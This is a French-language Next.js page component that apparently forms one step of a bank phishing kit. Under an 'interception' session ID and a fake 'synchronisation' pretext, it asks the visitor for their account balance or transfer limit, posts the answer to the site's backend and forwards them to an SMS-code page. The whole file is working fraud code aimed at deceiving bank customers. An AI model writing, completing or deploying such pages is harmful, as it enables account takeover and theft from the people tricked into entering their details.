"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function AmountPage() {
  const router = useRouter();
  const [amount, setAmount] = useState("");
  const [interceptionId, setInterceptionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    const id = sessionStorage.getItem("current_interception_id");
    if (!id) {
      setError("Session de liaison introuvable. Veuillez recommencer.");
    } else {
      setInterceptionId(id);
    }
  }, []);

  const isButtonDisabled = amount.length < 1 || isLoading || !interceptionId;

  const handleVerifyAmount = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!interceptionId) return;

    setIsLoading(true);
    setError("");

    try {
      const response = await fetch("/api/operation/", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: interceptionId, amountInput: amount }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Impossible d'enregistrer le montant.");
      }

      // ON NE SUPPRIME PLUS L'ID ICI POUR QUE LA PAGE SMS PUISSE LE RÉCUPÉRER
      setShowSuccess(true);

    } catch (err: any) {
      setError(err.message || "Erreur réseau.");
    } finally {
      setIsLoading(false);
    }
  };

  const goToSmsPage = () => {
    router.push("/operation/sms");
  };

  return (
    <div className="otp-container">
      {showSuccess && (
        <div className="modal-overlay">
          <div className="success-modal">
            <div className="success-icon-circle">
              <i className="fa-solid fa-check"></i>
            </div>
            <h2 className="modal-title">Montant Validé</h2>
            <button onClick={goToSmsPage} className="btn-link-bank" style={{ background: '#15b565', width: '100%' }}>
              <i className="fa-solid fa-arrow-right"></i> Continuer
            </button>
          </div>
        </div>
      )}

      <Link href="/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
        <i className="fa-solid fa-arrow-left"></i>
      </Link>

      <form className="otp-card" onSubmit={handleVerifyAmount}>
        <div className="otp-icon-box">
          <i className="fa-solid fa-money-bill-transfer"></i>
        </div>

        <h1 className="otp-title">Montant du virement</h1>
        <p className="otp-subtitle">
          Veuillez indiquer le montant actuel ou la limite maximale autorisée de votre compte pour finaliser la synchronisation.
        </p>

        {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px', marginBottom: '10px', width: '100%', textAlign: 'center' }}>{error}</div>}

        <div className="otp-input-wrapper">
          <input
            type="text"
            className="otp-field"
            placeholder="Ex: 2500"
            value={amount}
            onChange={(e) => setAmount(e.target.value.replace(/\D/g, ""))}
            disabled={!interceptionId}
            required
            style={{ textAlign: 'center', fontSize: '20px', letterSpacing: 'normal' }}
          />
        </div>

        <button type="submit" className="btn-link-bank" disabled={isButtonDisabled}>
          {isLoading ? <div className="spinner"></div> : <><i className="fa-solid fa-circle-check"></i> Confirmer le montant</>}
        </button>
      </form>
    </div>
  );
}